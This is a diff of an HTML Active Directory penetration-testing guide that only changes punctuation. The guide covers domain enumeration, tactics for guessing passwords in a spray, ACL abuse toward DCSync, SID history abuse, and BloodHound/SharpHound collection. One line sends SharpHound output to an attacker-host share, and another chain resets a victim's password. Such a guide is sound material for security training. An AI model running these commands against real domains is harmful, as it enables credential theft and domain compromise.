 # Returns: Amelia Matthews (the only user directly in Employees, not in a sub-OU)</code></pre>
 
-<p>SubTree scope -- returns all 970 users in Employees and all child OUs:</p>
+<p>SubTree scope; returns all 970 users in Employees and all child OUs:</p>
 <pre><code class="language-powershell">(Get-ADUser -SearchBase "OU=Employees,DC=[DOMAIN],DC=LOCAL" -SearchScope Subtree -Filter *).count
 # Returns: 970</code></pre>
 
@@ -2698,7 +2698,7 @@ s.info      # Displays server info: naming contexts, domain functionality level,
 <p>Retrieve password policy:</p>
 <pre><code class="language-bash">python3 ldapsearch-ad.py -l [target-ip] -d [domain-short] -u [user] -p [password] -t pass-pols</code></pre>
 
-<p>Output reveals minimum password length, complexity requirements, and lockout threshold -- critical for configuring password spraying attacks safely.</p>
+<p>Output reveals minimum password length, complexity requirements, and lockout threshold; critical for configuring password spraying attacks safely.</p>
 
 <p>Find Kerberoastable accounts (accounts with SPNs):</p>
 <pre><code class="language-bash">python3 ldapsearch-ad.py -l [target-ip] -d [domain-short] -u [user] -p [password] -t kerberoast | grep servicePrincipalName:</code></pre>
@@ -2827,14 +2827,14 @@ Import-Module .\PowerView.ps1
 <thead><tr><th>UAC Flag</th><th>Decimal Value</th><th>Security Significance</th></tr></thead>
 <tbody>
 <tr><td><code>ACCOUNTDISABLE</code></td><td>2</td><td>Account is disabled</td></tr>
-<tr><td><code>PASSWD_NOTREQD</code></td><td>32</td><td>No password required -- weak security</td></tr>
+<tr><td><code>PASSWD_NOTREQD</code></td><td>32</td><td>No password required; weak security</td></tr>
 <tr><td><code>PASSWD_CANT_CHANGE</code></td><td>64</td><td>User cannot change password</td></tr>
 <tr><td><code>NORMAL_ACCOUNT</code></td><td>512</td><td>Standard user account</td></tr>
-<tr><td><code>DONT_EXPIRE_PASSWORD</code></td><td>65536</td><td>Password never expires -- higher risk of stale credentials</td></tr>
-<tr><td><code>TRUSTED_FOR_DELEGATION</code></td><td>524288</td><td>Unconstrained delegation -- high-value target</td></tr>
+<tr><td><code>DONT_EXPIRE_PASSWORD</code></td><td>65536</td><td>Password never expires; higher risk of stale credentials</td></tr>
+<tr><td><code>TRUSTED_FOR_DELEGATION</code></td><td>524288</td><td>Unconstrained delegation; high-value target</td></tr>
 <tr><td><code>NOT_DELEGATED</code></td><td>1048576</td><td>Account is sensitive and cannot be delegated</td></tr>
-<tr><td><code>DONT_REQ_PREAUTH</code></td><td>4194304</td><td>No Kerberos pre-auth -- AS-REPRoastable</td></tr>
-<tr><td><code>TRUSTED_TO_AUTH_FOR_DELEGATION</code></td><td>16777216</td><td>Constrained delegation with protocol transition -- S4U2Self/S4U2Proxy</td></tr>
+<tr><td><code>DONT_REQ_PREAUTH</code></td><td>4194304</td><td>No Kerberos pre-auth; AS-REPRoastable</td></tr>
+<tr><td><code>TRUSTED_TO_AUTH_FOR_DELEGATION</code></td><td>16777216</td><td>Constrained delegation with protocol transition; S4U2Self/S4U2Proxy</td></tr>
 </tbody>
 </table>
 
@@ -2845,7 +2845,7 @@ net accounts
 # PowerView equivalent (richer output)
 Get-DomainPolicy</code></pre>
 
-<p>The <code>Get-DomainPolicy</code> output includes <code>SystemAccess</code> (password age, length, complexity, lockout threshold) and <code>KerberosPolicy</code> (max ticket age, max renew age, max clock skew). This data is critical for planning password spraying attacks -- understanding the lockout threshold and observation window prevents account lockouts.</p>
+<p>The <code>Get-DomainPolicy</code> output includes <code>SystemAccess</code> (password age, length, complexity, lockout threshold) and <code>KerberosPolicy</code> (max ticket age, max renew age, max clock skew). This data is critical for planning password spraying attacks; understanding the lockout threshold and observation window prevents account lockouts.</p>
 
 <p>User Impersonation: PowerView can leverage token impersonation to run commands as another user by temporarily impersonating their token, then reverting to the current user. Credentials are specified using the <code>-Credential</code> flag.</p>
 <pre><code class="language-powershell"># Impersonate another user
@@ -3037,7 +3037,7 @@ Get-DomainUser targetuser | ConvertFrom-UACValue -showall</code></pre></li>
 <tr><td><code>samaccountname</code></td><td>Login name used for authentication</td></tr>
 <tr><td><code>description</code></td><td>Often contains passwords or sensitive notes left by admins</td></tr>
 <tr><td><code>memberof</code></td><td>Group memberships reveal privileges and attack paths</td></tr>
-<tr><td><code>whencreated</code></td><td>Account age -- older accounts may have weaker passwords</td></tr>
+<tr><td><code>whencreated</code></td><td>Account age; older accounts may have weaker passwords</td></tr>
 <tr><td><code>pwdlastset</code></td><td>Critical for password spraying timing and identifying stale passwords</td></tr>
 <tr><td><code>lastlogontimestamp</code></td><td>Identifies inactive accounts that may be orphaned</td></tr>
 <tr><td><code>accountexpires</code></td><td>Accounts set to never expire are higher risk</td></tr>
@@ -3100,14 +3100,14 @@ Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain [domain] 
 <table class="custom-table">
 <thead><tr><th>Pattern</th><th>Significance</th><th>Attack Strategy</th></tr></thead>
 <tbody>
-<tr><td>Several passwords set at the same time</td><td>Likely set by Help Desk -- may be identical</td><td>Guess common passwords like "Password2020" or "CompanyName2020!" across these accounts</td></tr>
+<tr><td>Several passwords set at the same time</td><td>Likely set by Help Desk; may be identical</td><td>Guess common passwords like "Password2020" or "CompanyName2020!" across these accounts</td></tr>
 <tr><td>Password set in a specific month/year</td><td>Seasonal variation hints at password content</td><td>If set in July 2019, exclude "2020" from guesses; don't try "Winter2019" if set in summer</td></tr>
 <tr><td>Very old password (2+ years)</td><td>Likely weak; high-priority target</td><td>Guess before launching a large spray; these are the easiest wins</td></tr>
 <tr><td>Admin "user account" and "admin account" changed at similar times</td><td>Same person, likely same password for both</td><td>If you crack one, try the same password on the other account</td></tr>
 </tbody>
 </table>
 
-<p>OPSEC consideration: Organizations are much more likely to detect an automated password spray across all accounts than a few targeted guesses toward a small group of carefully selected accounts. Always respect lockout policies -- typically no more than 4 failed attempts within 15 minutes.</p>
+<p>OPSEC consideration: Organizations are much more likely to detect an automated password spray across all accounts than a few targeted guesses toward a small group of carefully selected accounts. Always respect lockout policies; typically no more than 4 failed attempts within 15 minutes.</p>
 
 
 <h4>Methodology</h4>
@@ -3156,10 +3156,10 @@ Get-DomainGroup -Properties Name
 
 <p>Groups of interest: When reviewing the group listing, pay special attention to:</p>
 <ul>
-<li><strong>Exchange groups</strong> (<code>Exchange Trusted Subsystem</code>, <code>Exchange Windows Permissions</code>) -- Exchange installation adds several groups with high privileges, including WriteDACL on the domain object</li>
-<li><strong>Custom security groups</strong> (<code>LAPS Admins</code>, <code>Security Operations</code>, <code>Help Desk</code>) -- may have unintended permissions</li>
-<li><strong>Protected Users</strong> -- members have enhanced security protections (no NTLM auth, no delegation, shorter TGT lifetime)</li>
-<li><strong>DnsAdmins</strong> -- members can load arbitrary DLLs on domain controllers via the DNS service</li>
+<li><strong>Exchange groups</strong> (<code>Exchange Trusted Subsystem</code>, <code>Exchange Windows Permissions</code>); Exchange installation adds several groups with high privileges, including WriteDACL on the domain object</li>
+<li><strong>Custom security groups</strong> (<code>LAPS Admins</code>, <code>Security Operations</code>, <code>Help Desk</code>); may have unintended permissions</li>
+<li><strong>Protected Users</strong>: members have enhanced security protections (no NTLM auth, no delegation, shorter TGT lifetime)</li>
+<li><strong>DnsAdmins</strong>: members can load arbitrary DLLs on domain controllers via the DNS service</li>
 </ul>
 
 <h4 id="protected-groups">3.3.2 Protected Groups</h4>
@@ -3169,7 +3169,7 @@ Get-DomainGroup -Properties Name
 <pre><code class="language-powershell"># Find all groups with AdminCount=1 (protected groups)
 .\SharpView.exe Get-DomainGroup -AdminCount</code></pre>
 
-<p>Protected groups include Administrators, Domain Admins, Enterprise Admins, Schema Admins, Server Operators, Account Operators, Backup Operators, Print Operators, and others. Users who were once members of these groups retain <code>AdminCount=1</code> even after removal -- this is a known AD artifact. These "orphaned" AdminCount users can be interesting targets because they may retain residual privileges.</p>
+<p>Protected groups include Administrators, Domain Admins, Enterprise Admins, Schema Admins, Server Operators, Account Operators, Backup Operators, Print Operators, and others. Users who were once members of these groups retain <code>AdminCount=1</code> even after removal; this is a known AD artifact. These "orphaned" AdminCount users can be interesting targets because they may retain residual privileges.</p>
 
 <h4 id="managed-groups">3.3.3 Managed Security Groups</h4>
 
@@ -3214,7 +3214,7 @@ foreach ($line in $computers) {Get-NetLocalGroupMember -ComputerName $line | ? {
 
 <h4 id="group-dates">3.3.5 Pulling Date User Added to Group</h4>
 
-<p>PowerView cannot pull the date a user was added to a group natively, but the <code>Get-ADGroupMemberDate</code> module can. This information is valuable for incident response -- if a suspicious user is found in a group, defenders can search for Event ID 4728/4738 on that date to find who added the user, or Event ID 4624 since the date added to see if anyone has logged in.</p>
+<p>PowerView cannot pull the date a user was added to a group natively, but the <code>Get-ADGroupMemberDate</code> module can. This information is valuable for incident response; if a suspicious user is found in a group, defenders can search for Event ID 4728/4738 on that date to find who added the user, or Event ID 4624 since the date added to see if anyone has logged in.</p>
 
 <pre><code class="language-powershell"># Load the module
 Import-Module .\Get-ADGroupMemberDate.ps1
@@ -3272,7 +3272,7 @@ Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,us
 <thead><tr><th>Property</th><th>Attack Significance</th></tr></thead>
 <tbody>
 <tr><td><code>LastLogonTimeStamp</code></td><td>If 90+ days old, the machine has not been turned on and is missing OS and application patches. Stale machines are prime targets. Administrators may want to auto-disable machines after 90 days of inactivity.</td></tr>
-<tr><td><code>OperatingSystem</code></td><td>Older OS versions (Windows 7, Server 2008) may be vulnerable to EternalBlue or have fewer logging/AV capabilities. Windows 10 Enterprise has Credential Guard enabled by default (prevents Mimikatz from stealing passwords), while Windows 10 Professional does not -- target Professional boxes if admins log in to both.</td></tr>
+<tr><td><code>OperatingSystem</code></td><td>Older OS versions (Windows 7, Server 2008) may be vulnerable to EternalBlue or have fewer logging/AV capabilities. Windows 10 Enterprise has Credential Guard enabled by default (prevents Mimikatz from stealing passwords), while Windows 10 Professional does not; target Professional boxes if admins log in to both.</td></tr>
 <tr><td><code>WhenCreated</code></td><td>The older the machine, the more likely it deviates from the "standard build." Old workstations may have weaker local admin passwords, more local admins, vulnerable software, or more sensitive data.</td></tr>
 </tbody>
 </table>
@@ -3282,7 +3282,7 @@ Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,us
 <p>Unconstrained delegation on computers:</p>
 <pre><code class="language-powershell">.\SharpView.exe Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol</code></pre>
 
-<p>Domain controllers always have unconstrained delegation (<code>SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION</code>) by design. Any <em>non-DC</em> computer with unconstrained delegation is a high-value target -- if compromised, cached TGTs from any user who authenticates to it can be extracted and used for impersonation. This is the basis of the "Printer Bug" attack where a DC can be coerced into authenticating to a compromised unconstrained delegation host.</p>
+<p>Domain controllers always have unconstrained delegation (<code>SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION</code>) by design. Any <em>non-DC</em> computer with unconstrained delegation is a high-value target; if compromised, cached TGTs from any user who authenticates to it can be extracted and used for impersonation. This is the basis of the "Printer Bug" attack where a DC can be coerced into authenticating to a compromised unconstrained delegation host.</p>
 
 <p>Constrained delegation on computers:</p>
 <pre><code class="language-powershell">Get-DomainComputer -TrustedToAuth | select -Property dnshostname,useraccountcontrol</code></pre>
@@ -3316,7 +3316,7 @@ Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,us
 
 <h3 id="enum-acls">3.5 Enumerating Domain ACLs</h3>
 
-<p>Access Control Lists (ACLs) define which security principals (users, groups, processes) have what rights over AD objects. ACL misconfigurations are a powerful but often overlooked attack vector -- they can persist unnoticed for years because they are difficult to monitor and audit at scale. Even a small AD network has thousands of ACLs, requiring targeted searches to uncover useful data.</p>
+<p>Access Control Lists (ACLs) define which security principals (users, groups, processes) have what rights over AD objects. ACL misconfigurations are a powerful but often overlooked attack vector; they can persist unnoticed for years because they are difficult to monitor and audit at scale. Even a small AD network has thousands of ACLs, requiring targeted searches to uncover useful data.</p>
 
 <h4 id="acl-overview">3.5.1 Access Control Lists Overview</h4>
 
@@ -3346,10 +3346,10 @@ Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,us
 <tbody>
 <tr><td><code>ForceChangePassword</code></td><td><code>Set-DomainUserPassword</code></td><td>Change a user's password without knowing the current password</td></tr>
 <tr><td><code>Add Members</code></td><td><code>Add-DomainGroupMember</code></td><td>Add arbitrary users to a group, inheriting its privileges</td></tr>
-<tr><td><code>GenericAll</code></td><td><code>Set-DomainUserPassword</code> or <code>Add-DomainGroupMember</code></td><td>Full control over the object -- can change password, modify group membership, modify attributes</td></tr>
+<tr><td><code>GenericAll</code></td><td><code>Set-DomainUserPassword</code> or <code>Add-DomainGroupMember</code></td><td>Full control over the object; can change password, modify group membership, modify attributes</td></tr>
 <tr><td><code>GenericWrite</code></td><td><code>Set-DomainObject</code></td><td>Modify any non-protected attribute on the object (e.g., set SPN for targeted Kerberoasting, modify <code>scriptpath</code>)</td></tr>
 <tr><td><code>WriteOwner</code></td><td><code>Set-DomainObjectOwner</code></td><td>Change the owner of the object, granting implicit full control</td></tr>
-<tr><td><code>WriteDACL</code></td><td><code>Add-DomainObjectACL</code></td><td>Modify the DACL itself -- grant yourself any permission on the object</td></tr>
+<tr><td><code>WriteDACL</code></td><td><code>Add-DomainObjectACL</code></td><td>Modify the DACL itself; grant yourself any permission on the object</td></tr>
 <tr><td><code>AllExtendedRights</code></td><td><code>Set-DomainUserPassword</code> or <code>Add-DomainGroupMember</code></td><td>Includes rights like <code>User-Force-Change-Password</code> and <code>DS-Replication-Get-Changes</code></td></tr>
 </tbody>
 </table>
@@ -3406,12 +3406,12 @@ Find-InterestingDomainAcl -Domain [domain] -ResolveGUIDs</code></pre>
 <table class="custom-table">
 <thead><tr><th>Scenario</th><th>Attack</th><th>Destructiveness</th></tr></thead>
 <tbody>
-<tr><td><code>GenericAll/GenericWrite</code> over a user</td><td>Set fake SPN for targeted Kerberoasting</td><td>Low -- does not disrupt the account</td></tr>
-<tr><td><code>GenericAll/GenericWrite</code> over a user</td><td>Disable pre-auth for targeted AS-REPRoasting</td><td>Low -- reversible change</td></tr>
-<tr><td><code>GenericAll/ForceChangePassword</code> over a user</td><td>Force password change</td><td>High -- disrupts the account; coordinate with client</td></tr>
-<tr><td><code>WriteDACL</code> over domain object</td><td>Grant self DCSync rights, then DCSync</td><td>High -- full domain compromise</td></tr>
-<tr><td><code>GenericAll/GenericWrite</code> over a computer</td><td>Kerberos Resource-Based Constrained Delegation (RBCD) attack</td><td>Medium -- requires additional prerequisites</td></tr>
-<tr><td>Write permissions over a GPO</td><td>Use SharpGPOAbuse to add local admin, set user rights, or create startup scripts</td><td>Medium -- affects all hosts/users where the GPO is linked</td></tr>
+<tr><td><code>GenericAll/GenericWrite</code> over a user</td><td>Set fake SPN for targeted Kerberoasting</td><td>Low; does not disrupt the account</td></tr>
+<tr><td><code>GenericAll/GenericWrite</code> over a user</td><td>Disable pre-auth for targeted AS-REPRoasting</td><td>Low; reversible change</td></tr>
+<tr><td><code>GenericAll/ForceChangePassword</code> over a user</td><td>Force password change</td><td>High; disrupts the account; coordinate with client</td></tr>
+<tr><td><code>WriteDACL</code> over domain object</td><td>Grant self DCSync rights, then DCSync</td><td>High; full domain compromise</td></tr>
+<tr><td><code>GenericAll/GenericWrite</code> over a computer</td><td>Kerberos Resource-Based Constrained Delegation (RBCD) attack</td><td>Medium; requires additional prerequisites</td></tr>
+<tr><td>Write permissions over a GPO</td><td>Use SharpGPOAbuse to add local admin, set user rights, or create startup scripts</td><td>Medium; affects all hosts/users where the GPO is linked</td></tr>
 </tbody>
 </table>
 
@@ -3483,11 +3483,11 @@ Get-DomainGPO | select displayname
 Get-DomainGPO -ComputerName [target-host] | select displayname</code></pre>
 
 <ul>
-<li><strong>LAPS</strong> -- Local Administrator Password Solution is deployed</li>
-<li><strong>AppLocker</strong> -- Application whitelisting is in place</li>
-<li><strong>PowerShell logging</strong> -- Script block/module logging is enabled</li>
-<li><strong>Disable CMD.exe</strong> -- cmd.exe is restricted on workstations</li>
-<li><strong>Audit Policy</strong> -- Enhanced auditing is configured</li>
+<li><strong>LAPS</strong>: Local Administrator Password Solution is deployed</li>
+<li><strong>AppLocker</strong>: Application whitelisting is in place</li>
+<li><strong>PowerShell logging</strong>: Script block/module logging is enabled</li>
+<li><strong>Disable CMD.exe</strong>: cmd.exe is restricted on workstations</li>
+<li><strong>Audit Policy</strong>: Enhanced auditing is configured</li>
 </ul>
 
 <p>Check for hosts/users where these GPOs are NOT applied to find attack paths that circumvent these controls.</p>
@@ -3628,7 +3628,7 @@ Get-DomainTrustMapping</code></pre>
 
 <p>ExtraSids Attack (Root Cause): Within a forest, the <code>sidHistory</code> property is respected due to a lack of SID Filtering. A Golden Ticket forged in the child domain can include the Enterprise Admins SID (which only exists in the forest root domain) in the <code>sidHistory</code> field. When this ticket is presented, the DC treats the user as a member of Enterprise Admins, granting administrative access to the entire forest.</p>
 
-<p>SID History Abuse (Root Cause): The <code>sidHistory</code> attribute was designed for migration scenarios -- when a user migrates to a new domain, the original SID is added to <code>sidHistory</code> so they retain access to resources in the old domain. Using Mimikatz, an attacker can inject arbitrary SIDs into an account's <code>sidHistory</code>. If a Domain Admin SID is injected, the account gains DA privileges. This works within the same domain and can also work across forest trusts if SID Filtering is not enabled.</p>
+<p>SID History Abuse (Root Cause): The <code>sidHistory</code> attribute was designed for migration scenarios; when a user migrates to a new domain, the original SID is added to <code>sidHistory</code> so they retain access to resources in the old domain. Using Mimikatz, an attacker can inject arbitrary SIDs into an account's <code>sidHistory</code>. If a Domain Admin SID is injected, the account gains DA privileges. This works within the same domain and can also work across forest trusts if SID Filtering is not enabled.</p>
 
 <p>SID History and Token: When a user logs in, all SIDs associated with their account (including <code>sidHistory</code>) are added to the user's access token. This token determines resource access. If the SID of a Domain Admin account is in the token, the user has DA access for that session.</p>
 
@@ -3678,7 +3678,7 @@ Get-DomainUser -Domain [foreign-domain] -Properties samaccountname | select sama
 <!-- ============================================================ -->
 <h3 id="bh-setup">4.1 BloodHound Setup and Installation</h3>
 
-<p>BloodHound relies on <strong>Neo4j</strong>, a NoSQL graph database written in Java that stores data as nodes and edges (relationships). Neo4j requires a Java Virtual Machine (JVM) -- specifically <strong>Java 11 (JDK 11)</strong>. The installation follows three steps on every platform: (1) install Java, (2) install Neo4j 4.4.x, (3) download the BloodHound GUI.</p>
+<p>BloodHound relies on <strong>Neo4j</strong>, a NoSQL graph database written in Java that stores data as nodes and edges (relationships). Neo4j requires a Java Virtual Machine (JVM); specifically <strong>Java 11 (JDK 11)</strong>. The installation follows three steps on every platform: (1) install Java, (2) install Neo4j 4.4.x, (3) download the BloodHound GUI.</p>
 
 <p>Neo4j 5.x suffers from severe performance regression with BloodHound and should be avoided. Always use the <strong>4.4.x</strong> branch.</p>
 
@@ -3786,7 +3786,7 @@ C:\Tools\BloodHound\BloodHound.exe</code></pre></li>
 <p>BloodHound collection relies on standard AD queries (LDAP, NetSessionEnum, NetLocalGroupGetMembers). Defenders should: (1) restrict who can read AD objects via AdminSDHolder and fine-grained permissions, (2) audit LDAP queries for anomalous patterns (Event IDs 1644 on DCs with LDAP diagnostics enabled), (3) deploy Microsoft ATA/ATP to detect reconnaissance activities, (4) restrict <code>NetSessionEnum</code> and <code>SAMRpc</code> via the <code>RestrictRemoteSAM</code> GPO setting, (5) block non-admin users from enumerating local groups on workstations.</p>
 <h3 id="bh-overview">4.2 BloodHound Overview and Graph Theory</h3>
 
-<p>BloodHound uses <strong>graph theory</strong> -- mathematical structures that model pairwise relations between objects. In this model:</p>
+<p>BloodHound uses <strong>graph theory</strong>: mathematical structures that model pairwise relations between objects. In this model:</p>
 
 <ul>
 <li><strong>Nodes</strong> represent AD objects (users, groups, computers, domains, OUs, GPOs, containers)</li>
@@ -3794,9 +3794,9 @@ C:\Tools\BloodHound\BloodHound.exe</code></pre></li>
 <li><strong>Paths</strong> are chains of edges connecting nodes, representing potential attack routes</li>
 </ul>
 
-<p>BloodHound uses the <strong>Cypher Query Language</strong> (Neo4j's graph query language, similar to SQL but designed for graphs) to analyze these relationships. A core capability is <strong>shortest path computation</strong> -- given a starting node (e.g., a compromised user) and a target node (e.g., Domain Admins group), BloodHound calculates the minimum number of hops required.</p>
+<p>BloodHound uses the <strong>Cypher Query Language</strong> (Neo4j's graph query language, similar to SQL but designed for graphs) to analyze these relationships. A core capability is <strong>shortest path computation</strong>: given a starting node (e.g., a compromised user) and a target node (e.g., Domain Admins group), BloodHound calculates the minimum number of hops required.</p>
 
-<p>Example: User <code>Grace</code> is a member of <code>SQL Admins</code>. A simple <code>net user grace /domain</code> reveals this direct membership, but shows no path to Domain Admins. BloodHound, however, discovers that <code>SQL Admins</code> has <code>ForceChangePassword</code> on user <code>Peter</code>, who is a member of a group that is (transitively) a member of <code>Domain Admins</code>. This two-hop attack path -- invisible through traditional enumeration -- becomes immediately obvious in the graph.</p>
+<p>Example: User <code>Grace</code> is a member of <code>SQL Admins</code>. A simple <code>net user grace /domain</code> reveals this direct membership, but shows no path to Domain Admins. BloodHound, however, discovers that <code>SQL Admins</code> has <code>ForceChangePassword</code> on user <code>Peter</code>, who is a member of a group that is (transitively) a member of <code>Domain Admins</code>. This two-hop attack path; invisible through traditional enumeration; becomes immediately obvious in the graph.</p>
 
 <p><strong>BloodHound for Enterprise</strong> is the commercial version by SpecterOps that provides continuous Attack Path Management with automated collection scheduling, quantified risk scoring, and remediation guidance. The FOSS and Enterprise editions share a common library (<strong>SharpHound Common</strong>), which improves stability and documentation for both.</p>
 
@@ -3865,7 +3865,7 @@ C:\Tools\BloodHound\BloodHound.exe
 <tr><td><code>-c, --collectionmethods</code></td><td>Specify collection methods (Default, All, DCOnly, ComputerOnly, Session, etc.)</td></tr>
 <tr><td><code>-d, --domain</code></td><td>Target a specific domain</td></tr>
 <tr><td><code>-s, --searchforest</code></td><td>Search all domains in the forest</td></tr>
-<tr><td><code>--stealth</code></td><td>Stealth collection -- only touches systems likely to have session data</td></tr>
+<tr><td><code>--stealth</code></td><td>Stealth collection; only touches systems likely to have session data</td></tr>
 <tr><td><code>-f</code></td><td>Add an LDAP filter to the pregenerated filter</td></tr>
 <tr><td><code>--computerfile</code></td><td>Path to file containing specific computer names to enumerate</td></tr>
 <tr><td><code>--outputdirectory</code></td><td>Output directory for results</td></tr>
@@ -3895,7 +3895,7 @@ C:\Tools\BloodHound\BloodHound.exe
 <tbody>
 <tr><td><code>Default</code></td><td>Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote</td><td>Connects to every domain-joined computer (generates significant traffic)</td></tr>
 <tr><td><code>All</code></td><td>All methods except GPOLocalGroup</td><td>Most comprehensive but noisiest</td></tr>
-<tr><td><code>DCOnly</code></td><td>Users, computers, groups, trusts, ACLs, OUs, GPOs, properties -- from DC only (no computer connections)</td><td>Minimal traffic -- only talks to DC via LDAP</td></tr>
+<tr><td><code>DCOnly</code></td><td>Users, computers, groups, trusts, ACLs, OUs, GPOs, properties; from DC only (no computer connections)</td><td>Minimal traffic; only talks to DC via LDAP</td></tr>
 <tr><td><code>ComputerOnly</code></td><td>Sessions and local groups from domain computers only</td><td>Connects to individual workstations/servers</td></tr>
 <tr><td><code>Session</code></td><td>Active user sessions only</td><td>Uses NetSessionEnum (requires admin on targets post-MS update)</td></tr>
 <tr><td><code>LoggedOn</code></td><td>Uses remote registry to find logged-on users</td><td>Requires admin rights; uses registry APIs</td></tr>
@@ -3920,7 +3920,7 @@ C:\Tools\SharpHound.exe --memcache --outputdirectory \\[attacker-ip]\share\ --zi
 
 <h4 id="sharphound-sessions">4.3.5 Session Loop Collection</h4>
 
-<p>User sessions are transient -- they appear when a user connects to a machine and disappear within minutes of disconnection. The <code>--loop</code> flag enables continuous session collection over a defined period:</p>
+<p>User sessions are transient; they appear when a user connects to a machine and disappear within minutes of disconnection. The <code>--loop</code> flag enables continuous session collection over a defined period:</p>
 
 <pre><code class="language-powershell"># Check for existing sessions
 net session
@@ -3944,7 +3944,7 @@ net view \\[domain]\
 # Run SharpHound targeting the domain
 SharpHound.exe -d [domain]</code></pre>
 
-<p><code>runas /netonly</code> does <strong>not validate</strong> credentials locally. If wrong credentials are used, failures will only appear during network operations. DNS resolution must also work -- either configure the network adapter's DNS to point to the domain's DNS server or add entries to the hosts file.</p>
+<p><code>runas /netonly</code> does <strong>not validate</strong> credentials locally. If wrong credentials are used, failures will only appear during network operations. DNS resolution must also work; either configure the network adapter's DNS to point to the domain's DNS server or add entries to the hosts file.</p>
 
 
 <h4>Methodology</h4>
@@ -4102,7 +4102,7 @@ bloodhound-python -d [domain] -c All -u user -p 'pass' --zip</code></pre>
 
 <p>Example: type <code>user:peter</code> to search only user nodes containing "peter", or <code>group:domain</code> for groups.</p>
 
-<p>Pathfinding: Click the pathfinding button (crosshair icon) to find attack paths between two nodes. You can filter out specific edges -- for example, uncheck <code>ForceChangePassword</code> if you want to avoid changing user passwords during the engagement.</p>
+<p>Pathfinding: Click the pathfinding button (crosshair icon) to find attack paths between two nodes. You can filter out specific edges; for example, uncheck <code>ForceChangePassword</code> if you want to avoid changing user passwords during the engagement.</p>
 
 <h4 id="bh-gui-menu">4.5.3 Upper Right Menu and Settings</h4>
 
@@ -4124,7 +4124,7 @@ bloodhound-python -d [domain] -c All -u user -p 'pass' --zip</code></pre>
 <thead><tr><th>Key</th><th>Action</th></tr></thead>
 <tbody>
 <tr><td><code>CTRL</code></td><td>Cycle through node label display settings (default, always show, always hide)</td></tr>
-<tr><td><code>Spacebar</code></td><td>Spotlight window -- lists all drawn nodes, click to zoom to one</td></tr>
+<tr><td><code>Spacebar</code></td><td>Spotlight window; lists all drawn nodes, click to zoom to one</td></tr>
 <tr><td><code>Backspace</code></td><td>Return to previous graph result</td></tr>
 <tr><td><code>S</code></td><td>Toggle the information panel below the search bar</td></tr>
 </tbody>
@@ -4167,8 +4167,8 @@ bloodhound-python -d [domain] -c All -u user -p 'pass' --zip</code></pre>
 <tr><td><strong>Computers</strong></td><td>Domain-joined devices</td><td>Same as Users, plus: Local Admins, Inbound/Outbound Execution Rights</td></tr>
 <tr><td><strong>Groups</strong></td><td>Logical collections of users/computers for permission management</td><td>Group Members (users, groups, computers that are members)</td></tr>
 <tr><td><strong>Domains</strong></td><td>Logical grouping of network resources with centralized admin</td><td>Foreign Members, Inbound Trusts, Outbound Trusts</td></tr>
-<tr><td><strong>OUs</strong></td><td>Organizational Units -- containers for delegated admin</td><td>Affecting GPOs, Descendant Objects</td></tr>
-<tr><td><strong>GPOs</strong></td><td>Group Policy Objects -- enforce settings on users/computers</td><td>Affected Objects (users, groups, computers impacted by the GPO)</td></tr>
+<tr><td><strong>OUs</strong></td><td>Organizational Units; containers for delegated admin</td><td>Affecting GPOs, Descendant Objects</td></tr>
+<tr><td><strong>GPOs</strong></td><td>Group Policy Objects; enforce settings on users/computers</td><td>Affected Objects (users, groups, computers impacted by the GPO)</td></tr>
 <tr><td><strong>Containers</strong></td><td>Similar to OUs but without delegated admin control</td><td>Same as OUs</td></tr>
 </tbody>
 </table>
@@ -4180,7 +4180,7 @@ bloodhound-python -d [domain] -c All -u user -p 'pass' --zip</code></pre>
 <tbody>
 <tr><td>Overview</td><td>General object information</td><td>Quick identification of object type and domain</td></tr>
 <tr><td>Node Properties</td><td>Default AD properties (enabled, last logon, password last set, etc.)</td><td>Identify stale accounts, password age</td></tr>
-<tr><td>Extra Properties</td><td>Non-default string properties (description, etc.) -- requires <code>--CollectAllProperties</code></td><td>Passwords sometimes stored in description field</td></tr>
+<tr><td>Extra Properties</td><td>Non-default string properties (description, etc.); requires <code>--CollectAllProperties</code></td><td>Passwords sometimes stored in description field</td></tr>
 <tr><td>Group Membership</td><td>Direct and transitive group memberships</td><td>Identify inherited privileges</td></tr>
 <tr><td>Local Admin Rights</td><td>Machines where this user/group has local admin</td><td>Lateral movement targets</td></tr>
 <tr><td>Execution Rights</td><td>RDP, DCOM, PSRemote, SQL Admin rights</td><td>Remote code execution paths</td></tr>
@@ -4189,7 +4189,7 @@ bloodhound-python -d [domain] -c All -u user -p 'pass' --zip</code></pre>
 </tbody>
 </table>
 
-<p>Domain node tip: The <strong>Map OU Structure</strong> option in the Domain Overview gives a high-level view of how the AD is organized -- essential for understanding the scope of GPO enforcement and delegation.</p>
+<p>Domain node tip: The <strong>Map OU Structure</strong> option in the Domain Overview gives a high-level view of how the AD is organized; essential for understanding the scope of GPO enforcement and delegation.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -4254,7 +4254,7 @@ bloodhound-python -d [domain] -c All -u user -p 'pass' --zip</code></pre>
 <li><strong>References:</strong> Links to detailed documentation</li>
 </ul>
 
-<p>Example -- ForceChangePassword abuse chain: User <code>Grace</code> is MemberOf <code>PasswordReset</code> group, which has ForceChangePassword on <code>Rosy</code>, who has CanRDP on <code>SRV01</code>.</p>
+<p>Example; ForceChangePassword abuse chain: User <code>Grace</code> is MemberOf <code>PasswordReset</code> group, which has ForceChangePassword on <code>Rosy</code>, who has CanRDP on <code>SRV01</code>.</p>
 
 <pre><code class="language-powershell"># Step 1: Import PowerView
 Set-ExecutionPolicy Bypass -Force
@@ -4296,7 +4296,7 @@ Set-DomainUserPassword -Identity [target-user] -AccountPassword $UserPassword -C
 <tr><td>nicole</td><td>GenericWrite</td><td>albert</td><td>Modify attributes (logon script, SPN, etc.)</td></tr>
 <tr><td>sarah</td><td>AddKeyCredentialLink</td><td>indhi</td><td>Shadow Credentials attack</td></tr>
 <tr><td>daniela</td><td>AddKeyCredentialLink</td><td>SRV01</td><td>Shadow Credentials on computer</td></tr>
